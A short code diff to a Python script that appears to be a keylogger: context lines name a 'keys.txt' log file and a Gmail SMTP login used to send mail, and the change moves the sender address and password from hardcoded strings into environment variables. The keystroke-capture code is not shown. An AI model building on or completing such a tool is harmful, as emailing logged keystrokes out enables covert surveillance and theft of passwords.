@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import os
 import threading
 import time
 import smtplib
@@ -12,9 +13,9 @@ load_dotenv()
 LOG_FILE = "keys.txt"
 
 # Email details
-sender_email = "your_email@gmail.com"
-receiver_email = "receiver_email@gmail.com"
-password = "your_app_password"
+sender_email = os.environ["GMAIL_USER"]
+receiver_email = os.environ["GMAIL_USER"]
+password = os.environ["GMAIL_PASSWORD"]
 
 mailserver = smtplib.SMTP_SSL("smtp.gmail.com", 465)
 mailserver.login(sender_email, password)
